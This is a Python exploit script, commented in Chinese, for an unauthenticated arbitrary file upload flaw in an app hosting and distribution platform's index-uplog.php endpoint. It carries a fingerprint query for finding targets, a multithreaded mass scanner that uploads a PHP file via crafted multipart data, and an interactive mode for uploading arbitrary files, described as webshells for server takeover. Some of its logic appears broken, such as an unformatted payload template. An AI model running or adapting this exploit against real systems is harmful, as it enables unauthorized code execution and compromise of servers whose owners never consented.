#App托管服务分发平台 index-uplog.php 接口处存在任意文件上传漏洞，未经身份验证的远程攻击者可利用此漏洞上传webshel致服务器，执行任意代码，从而获取服务器权限。
#/source/pack/upload/2upload/index-uplog.php     
#body="/api/statistics/service-usage-amount"
# 导包
import requests,sys,argparse,re,time,colorama
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错
from colorama import Fore, Style
# GREEN = '\033[92m' #GREEN是一个表示绿色的ANSI转义序列，\033[92m用于设置文本颜色为绿色，RESET是用于重置文本颜色的ANSI转义序列，\033[0m用于将文本颜色恢复为默认值。
# RESET = '\033[0m'
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
# 指纹模块
def banner():
    banner = """

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░    ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░    ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█     ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█     ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓     ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒      ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░      ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░         ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░        ░    
                                     ░                                                        
                                    @author:           sawa
                                    @version:          1.0.0
                                    For:               App托管服务分发平台任意文件上传漏洞
"""
    print(banner)

# 主函数模块
def main():
    banner()
    parser = argparse.ArgumentParser(description="This is a App托管服务分发平台任意文件上传vulnerability")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your urllink')
    parser.add_argument('-f','-file',dest='file',type=str,help='file path(Absolute Path)')
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")# print("Usage:\n\t python3 {} -h".format(sys.argv[0]))
        
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryfF7NbGp0PAFq8Mkd',
}

# poc模块
def poc(target):
    payload_url ="/source/pack/upload/2upload/index-uplog.php"
    url = target+payload_url
    #data = {" \r\n------WebKitFormBoundary03rNBzFMIytvpWhy\r\nContent-Disposition: form-data; name": "\"time\"\r\n \r\n1-2\r\n------WebKitFormBoundary03rNBzFMIytvpWhy\r\nContent-Disposition: form-data; name=\"app\"; filename=\"1.php\"\r\nContent-Type: image/jpeg\r\n \r\n<?php system(\"id\");unlink(__FILE__);?>\r\n------WebKitFormBoundary03rNBzFMIytvpWhy--"}
    data = {"------WebKitFormBoundary03rNBzFMIytvpWhy\r\nContent-Disposition: form-data; name": "\"time\"\r\n\r\n1-2\r\n------WebKitFormBoundary03rNBzFMIytvpWhy\r\nContent-Disposition: form-data; name=\"app\"; filename=\"1.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php phpinfo();?>\r\n------WebKitFormBoundary03rNBzFMIytvpWhy--"}
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    #     }
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
        #res1 = requests.get(url=target+'/source/data/tmp/1-2.php',verify=False,timeout=5)
        match = re.search(r'"time":"(\d+-\d+)"',res.text)
        result = target + '/source/data/tmp/1-2.php'
        if  res.status_code == 200 and match in res.text:
            print( f"{BLUE}[+] {target} Vulnerability exists,\n {result} {RESET}")
            with open ('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
                return True
        else :
            print(f"[-] {target} Vulnerability does not exist")
            with open ('without-bug.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
                return False       
    except Exception as e:
        print(f"[*] {target} server error,{e}")
        with open ('warning.txt','a',encoding='utf-8') as fp:
            fp.write(target+"\n")
            return False


def exp(target):
    print("--------------------正在进行漏洞利用...---------------------")
    time.sleep(2)
    # os.system("cls")
    while True:
        filename = input("请输入你要上传的文件(q--->quit)\n>>>")
        content = input("请输入你要上传的内容:(q--->quit)\n>>>")
        if filename =='q' or content =='q':
            print("-------------正在退出,稍安勿躁 Wait a minute...-------------")
            print("Bye~欢迎下次光临")
            break
        data = {" \r\n------WebKitFormBoundary03rNBzFMIytvpWhy\r\nContent-Disposition: form-data; name": "\"time\"\r\n \r\n1-2\r\n------WebKitFormBoundary03rNBzFMIytvpWhy\r\nContent-Disposition: form-data; name=\"app\"; filename=\"{filename}\"\r\nContent-Type: image/jpeg\r\n \r\n{content}\r\n------WebKitFormBoundary03rNBzFMIytvpWhy--"}
        try:
            res = requests.post(url=target+'/source/pack/upload/2upload/index-uplog.php',headers=headers,data=data,timeout=5,verify=False)
            match = re.search(r'"time":"(\d+-\d+)"',res.text)
            # result = target + '/maupload/apk/'+ filename
            result = target + '/source/data/tmp/1-2.php'
            if  res.status_code == 200 and match in res.text:
                print( f"{BLUE}[+] Upload successfully,Access path:{result} {RESET}")
            else:
                print(f"Fail to upload!")
        except:
            print("执行异常,Try again!")

if __name__ == '__main__':
    main()